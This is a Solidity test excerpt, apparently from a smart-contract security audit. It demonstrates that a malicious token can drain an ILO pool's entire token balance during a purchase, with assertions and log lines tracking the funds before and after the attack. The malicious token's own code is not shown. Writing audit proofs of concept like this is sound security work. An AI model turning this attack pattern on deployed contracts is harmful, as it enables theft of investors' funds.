...
contract ILOPoolTest is IntegrationTestBase {
    ...
    function testMaliciousTransferFrom() external {
        iloPool = _initPool(PROJECT_OWNER, _getInitPoolParamsForAudit());

        vm.prank(PROJECT_OWNER);
        IILOWhitelist(iloPool).batchWhitelist(_getListAddressFromAddress(INVESTOR));

        vm.prank(INVESTOR);
        maliciousToken.approve(iloPool, 1000000000 ether);

        _writeTokenBalance(address(maliciousToken), iloPool, 1000000000 ether);
        _writeTokenBalance(address(maliciousToken), INVESTOR, 1000000000 ether);
        uint256 balanceBefore = maliciousToken.balanceOf(iloPool);

        assertEq(maliciousToken.balanceOf(iloPool), 1000000000 ether);
        assertEq(maliciousToken.balanceOf(address(maliciousToken)), 0);

        console.log("iloPool contract balance before attack:", maliciousToken.balanceOf(iloPool));
        console.log("Malicious contract balance before attack:", maliciousToken.balanceOf(address(maliciousToken)));

        (uint256 tokenId, uint128 liquidity) = _buy(SALE_START + 1, 0.1 ether);
        uint256 balanceAfter = maliciousToken.balanceOf(iloPool);

        // assert user has a minted NFT
        assertGt(tokenId, 0);
        assertEq(uint256(liquidity), 40000000000000000);

        (uint128 _liquidity,,,) = IILOPool(iloPool).positions(tokenId);

        // assert user has a locked liquidity
        assertEq(uint256(_liquidity), 40000000000000000);

        assertEq(maliciousToken.balanceOf(iloPool), 0);
        assertEq(maliciousToken.balanceOf(address(maliciousToken)), 1000000000 ether);

        console.log("iloPool contract balance before attack:", maliciousToken.balanceOf(iloPool));
        console.log("Malicious contract balance after attack:", maliciousToken.balanceOf(address(maliciousToken)));
    }
